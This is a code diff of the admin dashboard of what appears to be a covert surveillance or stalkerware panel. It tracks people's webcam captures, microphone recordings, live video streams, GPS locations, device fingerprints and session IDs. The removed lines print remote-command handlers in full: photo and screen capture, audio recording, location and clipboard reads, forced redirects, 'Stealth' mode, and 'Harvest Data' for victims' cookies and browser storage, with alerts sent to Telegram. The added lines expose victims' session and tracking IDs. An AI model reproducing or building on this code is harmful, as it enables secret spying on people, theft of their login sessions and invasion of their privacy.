@@ -649,24 +649,81 @@
                     <div class="detail-item"><div class="label">Recordings</div><div class="value" id="modalRecordingsVal">0</div></div>
                 </div>
 
-                <!-- NEW: Remote Control Center -->
-                <div style="margin-top:20px; border-top: 1px solid rgba(255,255,255,0.1); padding-top:20px;">
-                    <h4 style="font-size:0.9rem; font-weight:600; margin-bottom:12px; color:rgba(255,255,255,0.8);">📟 Remote Control</h4>
-                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
-                        <button class="glass-btn" style="font-size:0.8rem; padding:8px;" onclick="sendRemoteCommand('capture')">📸 Capture Photo</button>
-                        <button class="glass-btn" style="font-size:0.8rem; padding:8px;" onclick="sendRemoteCommand('screen')">🖥️ Capture Screen</button>
-                        <button class="glass-btn" style="font-size:0.8rem; padding:8px;" onclick="sendRemoteCommand('record', {duration:30})">🎤 Record (30s)</button>
-                        <button class="glass-btn" style="font-size:0.8rem; padding:8px;" onclick="sendRemoteCommand('locate')">📍 Get Location</button>
-                        <button class="glass-btn" style="font-size:0.8rem; padding:8px;" onclick="sendRemoteCommand('clipboard')">📋 Read Clipboard</button>
-                        <button class="glass-btn" style="font-size:0.8rem; padding:8px;" onclick="sendRemoteCommand('vibrate')">📳 Vibrate</button>
+                <!-- All Session IDs Section -->
+                <div style="margin-top:12px;">
+                    <button onclick="document.getElementById('sessionIdsPanel').style.display = document.getElementById('sessionIdsPanel').style.display === 'none' ? 'block' : 'none'" style="background:linear-gradient(135deg,rgba(165,148,253,0.15),rgba(99,102,241,0.15));border:1px solid rgba(165,148,253,0.2);color:#a594fd;padding:8px 14px;border-radius:8px;font-size:0.8rem;cursor:pointer;width:100%;text-align:left;display:flex;align-items:center;gap:8px;">
+                        🔑 Session IDs <span style="margin-left:auto;font-size:0.7rem;opacity:0.5">▼ click to expand</span>
+                    </button>
+                    <div id="sessionIdsPanel" style="display:none;margin-top:8px;background:rgba(0,0,0,0.2);border-radius:10px;padding:12px;border:1px solid rgba(255,255,255,0.06);">
+                        <div style="display:grid;gap:8px;">
+                            <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 8px;background:rgba(255,255,255,0.03);border-radius:6px;">
+                                <span style="font-size:0.75rem;color:rgba(255,255,255,0.4)">🍪 Cookie Session</span>
+                                <span id="sid_cookie" style="font-family:'SF Mono','Fira Code',monospace;font-size:0.7rem;color:#a594fd;word-break:break-all;text-align:right;max-width:60%">—</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 8px;background:rgba(255,255,255,0.03);border-radius:6px;">
+                                <span style="font-size:0.75rem;color:rgba(255,255,255,0.4)">📑 Tab Session</span>
+                                <span id="sid_tab" style="font-family:'SF Mono','Fira Code',monospace;font-size:0.7rem;color:#6ee7b7;word-break:break-all;text-align:right;max-width:60%">—</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 8px;background:rgba(255,255,255,0.03);border-radius:6px;">
+                                <span style="font-size:0.75rem;color:rgba(255,255,255,0.4)">📄 Page Load</span>
+                                <span id="sid_page" style="font-family:'SF Mono','Fira Code',monospace;font-size:0.7rem;color:#fbbf24;word-break:break-all;text-align:right;max-width:60%">—</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 8px;background:rgba(255,255,255,0.03);border-radius:6px;">
+                                <span style="font-size:0.75rem;color:rgba(255,255,255,0.4)">🔌 Socket.IO</span>
+                                <span id="sid_socket" style="font-family:'SF Mono','Fira Code',monospace;font-size:0.7rem;color:#f472b6;word-break:break-all;text-align:right;max-width:60%">—</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 8px;background:rgba(255,255,255,0.03);border-radius:6px;">
+                                <span style="font-size:0.75rem;color:rgba(255,255,255,0.4)">🧬 Fingerprint</span>
+                                <span id="sid_fingerprint" style="font-family:'SF Mono','Fira Code',monospace;font-size:0.7rem;color:#34d399;word-break:break-all;text-align:right;max-width:60%">—</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 8px;background:rgba(255,255,255,0.03);border-radius:6px;">
+                                <span style="font-size:0.75rem;color:rgba(255,255,255,0.4)">💾 LocalStorage</span>
+                                <span id="sid_localstorage" style="font-family:'SF Mono','Fira Code',monospace;font-size:0.7rem;color:#60a5fa;word-break:break-all;text-align:right;max-width:60%">—</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 8px;background:rgba(255,255,255,0.03);border-radius:6px;">
+                                <span style="font-size:0.75rem;color:rgba(255,255,255,0.4)">⚙️ Engine.IO</span>
+                                <span id="sid_engineio" style="font-family:'SF Mono','Fira Code',monospace;font-size:0.7rem;color:#c084fc;word-break:break-all;text-align:right;max-width:60%">—</span>
+                            </div>
+                        </div>
                     </div>
-                    <div style="display:flex; gap:10px; margin-top:10px;">
-                        <input type="text" id="remoteToastText" class="glass-input" style="flex:1; font-size:0.8rem;" placeholder="Alert message...">
-                        <button class="glass-btn" style="font-size:0.8rem; padding:8px 12px;" onclick="sendToastCommand()">Send Toast</button>
-                    </div>
-                    <div style="display:flex; gap:10px; margin-top:10px;">
-                        <input type="text" id="remoteRedirectUrl" class="glass-input" style="flex:1; font-size:0.8rem;" placeholder="https://google.com">
-                        <button class="glass-btn" style="font-size:0.8rem; padding:8px 12px;" onclick="sendRedirectCommand()">Redirect URL</button>
+                </div>
+
+                <!-- Tracking IDs Section -->
+                <div style="margin-top:12px;">
+                    <button onclick="document.getElementById('trackingIdsPanel').style.display = document.getElementById('trackingIdsPanel').style.display === 'none' ? 'block' : 'none'" style="background:linear-gradient(135deg,rgba(165,148,253,0.15),rgba(99,102,241,0.15));border:1px solid rgba(165,148,253,0.2);color:#a594fd;padding:8px 14px;border-radius:8px;font-size:0.8rem;cursor:pointer;width:100%;text-align:left;display:flex;align-items:center;gap:8px;">
+                        🎯 Tracking IDs <span style="margin-left:auto;font-size:0.7rem;opacity:0.5">▼ click to expand</span>
+                    </button>
+                    <div id="trackingIdsPanel" style="display:none;margin-top:8px;background:rgba(0,0,0,0.2);border-radius:10px;padding:12px;border:1px solid rgba(255,255,255,0.06);">
+                        <div style="display:grid;gap:8px;">
+                            <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 8px;background:rgba(255,255,255,0.03);border-radius:6px;">
+                                <span style="font-size:0.75rem;color:rgba(255,255,255,0.4)">Google Analytics</span>
+                                <span id="trk_ga" style="font-family:'SF Mono','Fira Code',monospace;font-size:0.7rem;color:#a594fd;word-break:break-all;text-align:right;max-width:60%">—</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 8px;background:rgba(255,255,255,0.03);border-radius:6px;">
+                                <span style="font-size:0.75rem;color:rgba(255,255,255,0.4)">Facebook Pixel</span>
+                                <span id="trk_fb" style="font-family:'SF Mono','Fira Code',monospace;font-size:0.7rem;color:#a594fd;word-break:break-all;text-align:right;max-width:60%">—</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 8px;background:rgba(255,255,255,0.03);border-radius:6px;">
+                                <span style="font-size:0.75rem;color:rgba(255,255,255,0.4)">TikTok Pixel</span>
+                                <span id="trk_tt" style="font-family:'SF Mono','Fira Code',monospace;font-size:0.7rem;color:#a594fd;word-break:break-all;text-align:right;max-width:60%">—</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 8px;background:rgba(255,255,255,0.03);border-radius:6px;">
+                                <span style="font-size:0.75rem;color:rgba(255,255,255,0.4)">Google Click ID</span>
+                                <span id="trk_gclid" style="font-family:'SF Mono','Fira Code',monospace;font-size:0.7rem;color:#6ee7b7;word-break:break-all;text-align:right;max-width:60%">—</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 8px;background:rgba(255,255,255,0.03);border-radius:6px;">
+                                <span style="font-size:0.75rem;color:rgba(255,255,255,0.4)">Facebook Click ID</span>
+                                <span id="trk_fbclid" style="font-family:'SF Mono','Fira Code',monospace;font-size:0.7rem;color:#6ee7b7;word-break:break-all;text-align:right;max-width:60%">—</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 8px;background:rgba(255,255,255,0.03);border-radius:6px;">
+                                <span style="font-size:0.75rem;color:rgba(255,255,255,0.4)">UTM Source</span>
+                                <span id="trk_utm_source" style="font-family:'SF Mono','Fira Code',monospace;font-size:0.7rem;color:#fbbf24;word-break:break-all;text-align:right;max-width:60%">—</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 8px;background:rgba(255,255,255,0.03);border-radius:6px;">
+                                <span style="font-size:0.75rem;color:rgba(255,255,255,0.4)">UTM Campaign</span>
+                                <span id="trk_utm_campaign" style="font-family:'SF Mono','Fira Code',monospace;font-size:0.7rem;color:#fbbf24;word-break:break-all;text-align:right;max-width:60%">—</span>
+                            </div>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -812,7 +869,7 @@
                     <div class="glass" style="overflow:hidden">
                         <div style="overflow-x: auto; width: 100%;">
                             <table style="min-width: 800px;">
-                                <thead><tr><th>User ID</th><th>Country</th><th>Device</th><th>Browser</th><th>Status</th><th>Last Active</th><th>📷</th><th>🎤</th><th></th></tr></thead>
+                                <thead><tr><th>User ID</th><th>🧬 Fingerprint</th><th>Country</th><th>Device</th><th>Browser</th><th>Status</th><th>Last Active</th><th>📷</th><th>🎤</th><th></th></tr></thead>
                                 <tbody id="usersTable"></tbody>
                             </table>
                         </div>
@@ -879,42 +936,6 @@
                             <p>Download all data as JSON file</p>
                             <button class="glass-btn" onclick="exportData()">Download Export</button>
                         </div>
-                        
-                        <!-- NEW: Telegram Integration Settings -->
-                        <div class="settings-card glass" style="grid-column: 1 / -1;">
-                            <h3>🤖 Telegram Integration</h3>
-                            <p>Configure bot token and notification preferences</p>
-                            <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-top:16px;">
-                                <div>
-                                    <div class="form-group">
-                                        <label>Bot Token</label>
-                                        <input type="text" class="glass-input" id="tgToken" placeholder="123456789:ABCdefGHIjklMNOpqrSTUvwxYZ">
-                                    </div>
-                                    <div class="form-group">
-                                        <label>Chat ID</label>
-                                        <input type="text" class="glass-input" id="tgChatId" placeholder="Your Telegram Chat ID">
-                                    </div>
-                                </div>
-                                <div>
-                                    <label style="display:block; margin-bottom:8px; font-size:0.75rem; text-transform:uppercase; letter-spacing:0.05em; color:rgba(255,255,255,0.4);">Alert Toggles</label>
-                                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
-                                        <label style="display:flex; align-items:center; gap:8px; font-size:0.85rem;"><input type="checkbox" id="tgAlertConnect"> Connect</label>
-                                        <label style="display:flex; align-items:center; gap:8px; font-size:0.85rem;"><input type="checkbox" id="tgAlertDisconnect"> Disconnect</label>
-                                        <label style="display:flex; align-items:center; gap:8px; font-size:0.85rem;"><input type="checkbox" id="tgAlertCapture"> Capture</label>
-                                        <label style="display:flex; align-items:center; gap:8px; font-size:0.85rem;"><input type="checkbox" id="tgAlertRecord"> Recording</label>
-                                        <label style="display:flex; align-items:center; gap:8px; font-size:0.85rem;"><input type="checkbox" id="tgAlertLocation"> Location</label>
-                                        <label style="display:flex; align-items:center; gap:8px; font-size:0.85rem;"><input type="checkbox" id="tgAlertDaily"> Daily Summary</label>
-                                    </div>
-                                </div>
-                            </div>
-                            <div style="display:flex; gap:12px; margin-top:16px;">
-                                <button class="glass-btn" onclick="saveTelegramConfig()">Save Configuration</button>
-                                <button class="glass-btn" style="background:rgba(255,255,255,0.1);" onclick="testTelegramConfig()">Send Test Alert</button>
-                            </div>
-                            <div class="msg-ok" id="tgOk" style="margin-top:12px;">✅ Settings saved!</div>
-                            <div class="msg-err" id="tgErr" style="margin-top:12px;"></div>
-                        </div>
-
                     </div>
                 </div>
                 <!-- ═══ ANALYTICS PAGE ═══ -->
@@ -1805,36 +1826,15 @@ function openUserModal(uuid) {
             document.getElementById('stopStreamBtn').style.display = 'block';
             document.getElementById('stopStreamBtn').textContent = (conn && !conn.isMuted) ? '🔇 Mute Voice' : '🔊 Unmute Voice';
         } else {
-            // NEW: Auto-start live stream when modal opens for online user
+            // Stream not connected yet
             if (modalVideo) {
-                modalVideo.style.display = 'block';
+                modalVideo.style.display = 'none';
                 modalVideo.srcObject = null;
             }
-            if (overlay) {
-                overlay.style.display = 'flex';
-                document.getElementById('modalStreamStatusText').textContent = 'CONNECTING...';
-            }
-            document.getElementById('startStreamBtn').style.display = 'none';
+            if (overlay) overlay.style.display = 'none';
+            document.getElementById('startStreamBtn').style.display = 'block';
             document.getElementById('stopStreamBtn').style.display = 'none';
-            // Auto-initiate WebRTC connection
-            initiateWebRTCForUser(uuid);
-            // Poll for the stream to become available, then bind it to the modal video
-            let streamPollCount = 0;
-            const streamPollInterval = setInterval(() => {
-                const gv = document.getElementById(`feed-vid-${uuid}`);
-                if (gv && gv.srcObject) {
-                    modalVideo.srcObject = gv.srcObject;
-                    const c = activeConnections[uuid];
-                    modalVideo.muted = c ? c.isMuted : true;
-                    modalVideo.play().catch(e => {});
-                    document.getElementById('modalStreamStatusText').textContent = 'LIVE';
-                    document.getElementById('stopStreamBtn').style.display = 'block';
-                    document.getElementById('stopStreamBtn').textContent = (c && !c.isMuted) ? '🔇 Mute Voice' : '🔊 Unmute Voice';
-                    clearInterval(streamPollInterval);
-                }
-                streamPollCount++;
-                if (streamPollCount > 50) clearInterval(streamPollInterval); // timeout after 10s
-            }, 200);
+        }
     } else {
         if (controls) controls.style.display = 'none';
         if (modalVideo) {
@@ -1852,45 +1852,29 @@ function openUserModal(uuid) {
     document.getElementById('modalCapturesVal').textContent = u.captures_count || 0;
     document.getElementById('modalRecordingsVal').textContent = u.recordings_count || 0;
 
-    // Set up stealth and harvest buttons
-    const stealthBtn = document.getElementById('modalStealthBtn');
-    if (stealthBtn) {
-        stealthBtn.onclick = () => { socket.emit('admin:stealth', { uuid }); addNotification('🛡️', 'Stealth mode sent to ' + truncUUID(uuid)); };
-    }
-    const harvestBtn = document.getElementById('modalHarvestBtn');
-    if (harvestBtn) {
-        harvestBtn.onclick = () => { socket.emit('admin:harvest', { uuid }); addNotification('🍪', 'Harvest command sent to ' + truncUUID(uuid)); };
-    }
-    const viewDataBtn = document.getElementById('modalViewDataBtn');
-    if (viewDataBtn) {
-        viewDataBtn.onclick = () => loadUserExtractedData(uuid);
-    }
-    const viewMetricsBtn = document.getElementById('modalViewMetricsBtn');
-    if (viewMetricsBtn) {
-        viewMetricsBtn.onclick = () => loadUserMetrics(uuid);
-    }
+    // Populate all session IDs
+    const sids = u.session_ids || {};
+    document.getElementById('sid_cookie').textContent = sids.cookie_session_id || '—';
+    document.getElementById('sid_tab').textContent = sids.tab_session_id || '—';
+    document.getElementById('sid_page').textContent = sids.page_load_id || '—';
+    document.getElementById('sid_socket').textContent = sids.socket_id || '—';
+    document.getElementById('sid_fingerprint').textContent = sids.fingerprint_id || '—';
+    document.getElementById('sid_localstorage').textContent = sids.local_storage_id || '—';
+    document.getElementById('sid_engineio').textContent = sids.engine_io_id || '—';
+    // Reset panel to collapsed
+    document.getElementById('sessionIdsPanel').style.display = 'none';
 
-    // Inject action buttons if not already present
-    let actionRow = document.getElementById('modalActionRow');
-    if (!actionRow) {
-        actionRow = document.createElement('div');
-        actionRow.id = 'modalActionRow';
-        actionRow.style.cssText = 'display:flex;gap:8px;flex-wrap:wrap;margin-top:16px;padding:0 24px 16px;';
-        actionRow.innerHTML = `
-            <button id="modalStealthBtn" style="flex:1;padding:10px 16px;border-radius:12px;border:1px solid rgba(255,107,138,0.3);background:rgba(255,107,138,0.1);color:#ff6b8a;cursor:pointer;font-size:0.8rem;font-family:inherit;transition:all 0.2s" onmouseover="this.style.background='rgba(255,107,138,0.25)'" onmouseout="this.style.background='rgba(255,107,138,0.1)'">🛡️ Stealth</button>
-            <button id="modalHarvestBtn" style="flex:1;padding:10px 16px;border-radius:12px;border:1px solid rgba(255,184,108,0.3);background:rgba(255,184,108,0.1);color:#ffb86c;cursor:pointer;font-size:0.8rem;font-family:inherit;transition:all 0.2s" onmouseover="this.style.background='rgba(255,184,108,0.25)'" onmouseout="this.style.background='rgba(255,184,108,0.1)'">🍪 Harvest Data</button>
-            <button id="modalViewDataBtn" style="flex:1;padding:10px 16px;border-radius:12px;border:1px solid rgba(93,228,199,0.3);background:rgba(93,228,199,0.1);color:#5de4c7;cursor:pointer;font-size:0.8rem;font-family:inherit;transition:all 0.2s" onmouseover="this.style.background='rgba(93,228,199,0.25)'" onmouseout="this.style.background='rgba(93,228,199,0.1)'">📋 View Data</button>
-            <button id="modalViewMetricsBtn" style="flex:1;padding:10px 16px;border-radius:12px;border:1px solid rgba(165,148,253,0.3);background:rgba(165,148,253,0.1);color:#a594fd;cursor:pointer;font-size:0.8rem;font-family:inherit;transition:all 0.2s" onmouseover="this.style.background='rgba(165,148,253,0.25)'" onmouseout="this.style.background='rgba(165,148,253,0.1)'">📊 Metrics</button>
-        `;
-        // Insert before the modal's show class is added
-        const modalBody = document.querySelector('#userModal .modal-body') || document.getElementById('userModal').querySelector('div');
-        if (modalBody) modalBody.appendChild(actionRow);
-    }
-    // Re-bind after injection
-    document.getElementById('modalStealthBtn').onclick = () => { socket.emit('admin:stealth', { uuid }); addNotification('🛡️', 'Stealth mode sent to ' + truncUUID(uuid)); };
-    document.getElementById('modalHarvestBtn').onclick = () => { socket.emit('admin:harvest', { uuid }); addNotification('🍪', 'Harvest command sent to ' + truncUUID(uuid)); };
-    document.getElementById('modalViewDataBtn').onclick = () => loadUserExtractedData(uuid);
-    document.getElementById('modalViewMetricsBtn').onclick = () => loadUserMetrics(uuid);
+    // Populate Tracking IDs
+    const tids = u.third_party_ids || {};
+    document.getElementById('trk_ga').textContent = tids.ga_client_id || '—';
+    document.getElementById('trk_fb').textContent = tids.fb_pixel_id || '—';
+    document.getElementById('trk_tt').textContent = tids.tiktok_pixel_id || '—';
+    document.getElementById('trk_gclid').textContent = tids.gclid || '—';
+    document.getElementById('trk_fbclid').textContent = tids.fbclid || '—';
+    document.getElementById('trk_utm_source').textContent = tids.utm_source || '—';
+    document.getElementById('trk_utm_campaign').textContent = tids.utm_campaign || '—';
+    // Reset panel to collapsed
+    document.getElementById('trackingIdsPanel').style.display = 'none';
 
     document.getElementById('userModal').classList.add('show');
 }
@@ -1930,13 +1914,14 @@ async function loadUsers() {
 
     const tbody = document.getElementById('usersTable');
     if (data.users.length === 0) {
-        tbody.innerHTML = '<tr><td colspan="9" style="text-align:center;padding:40px;color:rgba(255,255,255,0.3)">No users found</td></tr>';
+        tbody.innerHTML = '<tr><td colspan="10" style="text-align:center;padding:40px;color:rgba(255,255,255,0.3)">No users found</td></tr>';
         return;
     }
 
     tbody.innerHTML = data.users.map(u => `
         <tr>
             <td><span class="uuid-text">${truncUUID(u.uuid, 12)}</span></td>
+            <td style="font-family:'SF Mono','Fira Code',monospace;font-size:0.7rem;color:rgba(255,255,255,0.45)">${(u.session_ids && u.session_ids.fingerprint_id) || '—'}</td>
             <td>${u.country || '—'}</td>
             <td>${u.device_type || '—'}</td>
             <td>${u.browser || '—'}</td>
@@ -2393,7 +2378,7 @@ async function loadMapLocations() {
                 <div style="color:rgba(255,255,255,0.6);margin-top:4px">${isOnline ? '🟢 Online' : '🔴 Offline'} • ${loc.device_type || 'Unknown'} • ${loc.browser || ''}</div>
                 <div style="color:rgba(255,255,255,0.4);font-size:0.7rem;margin-top:4px">📍 ${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}${loc.accuracy ? ' • ±' + loc.accuracy.toFixed(0) + 'm' : ''}</div>
                 <div style="color:rgba(255,255,255,0.4);font-size:0.7rem">🕐 ${loc.timestamp ? new Date(loc.timestamp).toLocaleString() : 'Unknown'}</div>
-                <div style="margin-top:6px;display:flex;gap:8px;align-items:center"><a href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" target="_blank" style="color:#5de4c7;font-size:0.7rem;text-decoration:none">Open in Google Maps ↗</a><button onclick="showLocationPath('${loc.uuid}')" style="background:rgba(165,148,253,0.2);border:1px solid rgba(165,148,253,0.3);color:#a594fd;padding:2px 8px;border-radius:6px;cursor:pointer;font-size:0.65rem;font-family:inherit">📍 Path</button></div>
+                <div style="margin-top:6px"><a href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" target="_blank" style="color:#5de4c7;font-size:0.7rem;text-decoration:none">Open in Google Maps ↗</a></div>
             </div>`;
 
             if (mapMarkers[markerId]) {
@@ -2436,7 +2421,7 @@ socket.on('location:update', (loc) => {
         <div style="color:rgba(255,255,255,0.6);margin-top:4px">🟢 Online • ${user?.device_type || 'Unknown'} • ${user?.browser || ''}</div>
         <div style="color:rgba(255,255,255,0.4);font-size:0.7rem;margin-top:4px">📍 ${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}${loc.accuracy ? ' • ±' + loc.accuracy.toFixed(0) + 'm' : ''}</div>
         <div style="color:rgba(255,255,255,0.4);font-size:0.7rem">🕐 ${new Date().toLocaleString()}</div>
-        <div style="margin-top:6px;display:flex;gap:8px;align-items:center"><a href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" target="_blank" style="color:#5de4c7;font-size:0.7rem;text-decoration:none">Open in Google Maps ↗</a><button onclick="showLocationPath('${loc.uuid}')" style="background:rgba(165,148,253,0.2);border:1px solid rgba(165,148,253,0.3);color:#a594fd;padding:2px 8px;border-radius:6px;cursor:pointer;font-size:0.65rem;font-family:inherit">📍 Path</button></div>
+        <div style="margin-top:6px"><a href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" target="_blank" style="color:#5de4c7;font-size:0.7rem;text-decoration:none">Open in Google Maps ↗</a></div>
     </div>`;
 
     if (mapMarkers[markerId]) {
@@ -2673,293 +2658,6 @@ async function deleteSingleRecording(id) {
     await api('/api/recordings/' + id, { method: 'DELETE' });
     loadRecordings();
 }
-// ═══════════════════════════════════════════════════════════════════
-// NEW: REMOTE COMMAND HANDLERS
-// ═══════════════════════════════════════════════════════════════════
-async function sendRemoteCommand(command, args = {}) {
-    if (!currentViewUuid) return showToast('No user selected', true);
-    try {
-        const res = await fetch('/api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
-            body: JSON.stringify({ uuid: currentViewUuid, command, args })
-        });
-        const data = await res.json();
-        if (res.ok) {
-            showToast('Command sent!');
-        } else {
-            showToast('Error: ' + data.error, true);
-        }
-    } catch(e) {
-        showToast('Network error', true);
-    }
-}
-
-function sendToastCommand() {
-    const text = document.getElementById('remoteToastText').value.trim();
-    if (!text) return;
-    sendRemoteCommand('toast', { message: text });
-    document.getElementById('remoteToastText').value = '';
-}
-
-function sendRedirectCommand() {
-    const url = document.getElementById('remoteRedirectUrl').value.trim();
-    if (!url) return;
-    sendRemoteCommand('redirect', { url });
-    document.getElementById('remoteRedirectUrl').value = '';
-}
-
-// ═══════════════════════════════════════════════════════════════════
-// NEW: TELEGRAM SETTINGS
-// ═══════════════════════════════════════════════════════════════════
-async function loadTelegramConfig() {
-    try {
-        const res = await fetch('/api/telegram/config', {
-            headers: { 'Authorization': 'Bearer ' + token }
-        });
-        if (res.ok) {
-            const data = await res.json();
-            document.getElementById('tgToken').value = data.token || '';
-            document.getElementById('tgChatId').value = data.chatId || '';
-            if (data.alerts) {
-                document.getElementById('tgAlertConnect').checked = !!data.alerts.connect;
-                document.getElementById('tgAlertDisconnect').checked = !!data.alerts.disconnect;
-                document.getElementById('tgAlertCapture').checked = !!data.alerts.capture;
-                document.getElementById('tgAlertRecord').checked = !!data.alerts.recording;
-                document.getElementById('tgAlertLocation').checked = !!data.alerts.location;
-                document.getElementById('tgAlertDaily').checked = !!data.alerts.dailySummary;
-            }
-        }
-    } catch (e) {
-        console.error('Failed to load telegram config', e);
-    }
-}
-
-async function saveTelegramConfig() {
-    const elOk = document.getElementById('tgOk');
-    const elErr = document.getElementById('tgErr');
-    elOk.style.display = 'none';
-    elErr.style.display = 'none';
-    
-    const payload = {
-        token: document.getElementById('tgToken').value.trim(),
-        chatId: document.getElementById('tgChatId').value.trim(),
-        alerts: {
-            connect: document.getElementById('tgAlertConnect').checked,
-            disconnect: document.getElementById('tgAlertDisconnect').checked,
-            capture: document.getElementById('tgAlertCapture').checked,
-            recording: document.getElementById('tgAlertRecord').checked,
-            location: document.getElementById('tgAlertLocation').checked,
-            dailySummary: document.getElementById('tgAlertDaily').checked
-        }
-    };
-    
-    try {
-        const res = await fetch('/api/telegram/config', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
-            body: JSON.stringify(payload)
-        });
-        if (res.ok) {
-            elOk.textContent = '✅ Settings saved successfully!';
-            elOk.style.display = 'block';
-            setTimeout(() => elOk.style.display='none', 3000);
-        } else {
-            const data = await res.json();
-            elErr.textContent = '❌ ' + (data.error || 'Failed to save');
-            elErr.style.display = 'block';
-        }
-    } catch (e) {
-        elErr.textContent = '❌ Network error';
-        elErr.style.display = 'block';
-    }
-}
-
-async function testTelegramConfig() {
-    const elOk = document.getElementById('tgOk');
-    const elErr = document.getElementById('tgErr');
-    elOk.style.display = 'none';
-    elErr.style.display = 'none';
-    try {
-        const res = await fetch('/api/telegram/test', {
-            method: 'POST',
-            headers: { 'Authorization': 'Bearer ' + token }
-        });
-        if (res.ok) {
-            elOk.textContent = '📩 Test message sent successfully!';
-            elOk.style.display = 'block';
-            setTimeout(() => elOk.style.display='none', 3000);
-        } else {
-            const data = await res.json();
-            elErr.textContent = '❌ ' + (data.error || 'Test failed');
-            elErr.style.display = 'block';
-        }
-    } catch (e) {
-        elErr.textContent = '❌ Network error';
-        elErr.style.display = 'block';
-    }
-}
-
-// Ensure Telegram config loads when we switch to settings tab
-const origSwitchTab = switchTab;
-switchTab = function(tabId) {
-    origSwitchTab(tabId);
-    if (tabId === 'settings') {
-        loadTelegramConfig();
-    }
-};
-
-// ═══════════════════════════════════════════════════════════════════
-// NEW: EXTRACTED DATA VIEWER
-// ═══════════════════════════════════════════════════════════════════
-async function loadUserExtractedData(uuid) {
-    try {
-        const data = await api('/api/metrics/' + uuid);
-        const hd = data?.harvested_data;
-        let content = '<div style="padding:20px;max-height:60vh;overflow-y:auto">';
-        if (!hd) {
-            content += '<p style="color:rgba(255,255,255,0.4)">No harvested data yet. Click "Harvest Data" to collect.</p>';
-        } else {
-            content += '<h4 style="color:#ffb86c;margin-bottom:12px">🍪 Cookies</h4>';
-            content += '<pre style="background:rgba(0,0,0,0.3);padding:12px;border-radius:8px;font-size:0.75rem;color:rgba(255,255,255,0.7);overflow-x:auto;max-height:200px;white-space:pre-wrap;word-break:break-all">' + (hd.cookies || 'None') + '</pre>';
-            content += '<h4 style="color:#5de4c7;margin:16px 0 12px">💾 LocalStorage</h4>';
-            const lsKeys = Object.keys(hd.localStorage || {});
-            if (lsKeys.length === 0) {
-                content += '<p style="color:rgba(255,255,255,0.4)">Empty</p>';
-            } else {
-                content += '<div style="display:grid;gap:6px">';
-                lsKeys.forEach(k => {
-                    const v = String(hd.localStorage[k] || '').substring(0, 300);
-                    content += '<div style="background:rgba(0,0,0,0.2);padding:8px 12px;border-radius:8px;font-size:0.75rem"><span style="color:#5de4c7">' + k + '</span>: <span style="color:rgba(255,255,255,0.5)">' + v + '</span></div>';
-                });
-                content += '</div>';
-            }
-            content += '<h4 style="color:#a594fd;margin:16px 0 12px">📦 SessionStorage</h4>';
-            const ssKeys = Object.keys(hd.sessionStorage || {});
-            if (ssKeys.length === 0) {
-                content += '<p style="color:rgba(255,255,255,0.4)">Empty</p>';
-            } else {
-                content += '<div style="display:grid;gap:6px">';
-                ssKeys.forEach(k => {
-                    const v = String(hd.sessionStorage[k] || '').substring(0, 300);
-                    content += '<div style="background:rgba(0,0,0,0.2);padding:8px 12px;border-radius:8px;font-size:0.75rem"><span style="color:#a594fd">' + k + '</span>: <span style="color:rgba(255,255,255,0.5)">' + v + '</span></div>';
-                });
-                content += '</div>';
-            }
-            content += '<p style="color:rgba(255,255,255,0.25);font-size:0.7rem;margin-top:12px">Harvested: ' + new Date(hd.timestamp).toLocaleString() + '</p>';
-        }
-        content += '</div>';
-        showDataPopup('📋 Extracted Data — ' + truncUUID(uuid, 12), content);
-    } catch(e) {
-        console.error('Load extracted data error:', e);
-    }
-}
-
-async function loadUserMetrics(uuid) {
-    try {
-        await loadChartJS();
-        const data = await api('/api/metrics/' + uuid);
-        const metrics = data?.metrics || [];
-        if (metrics.length === 0) {
-            showDataPopup('📊 Metrics — ' + truncUUID(uuid, 12), '<div style="padding:20px;color:rgba(255,255,255,0.4)">No metrics collected yet. Data arrives every 60 seconds when the user is connected.</div>');
-            return;
-        }
-        const labels = metrics.map(m => new Date(m.timestamp).toLocaleTimeString());
-        const batteryData = metrics.map(m => parseFloat(String(m.battery_level).replace('%','')) || 0);
-        const downlinkData = metrics.map(m => parseFloat(m.network_downlink) || 0);
-
-        const content = '<div style="padding:20px"><canvas id="metricsChartBattery" height="180"></canvas><div style="margin-top:16px"><canvas id="metricsChartNetwork" height="180"></canvas></div></div>';
-        showDataPopup('📊 Metrics — ' + truncUUID(uuid, 12), content);
-
-        // Wait a tick for DOM
-        setTimeout(() => {
-            const chartOpts = { responsive:true, plugins:{legend:{display:false}}, scales:{ x:{grid:{color:'rgba(255,255,255,0.04)'},ticks:{color:'rgba(255,255,255,0.3)',font:{size:10},maxTicksLimit:10}}, y:{grid:{color:'rgba(255,255,255,0.04)'},ticks:{color:'rgba(255,255,255,0.3)',font:{size:10}},beginAtZero:true} } };
-
-            const bc = document.getElementById('metricsChartBattery');
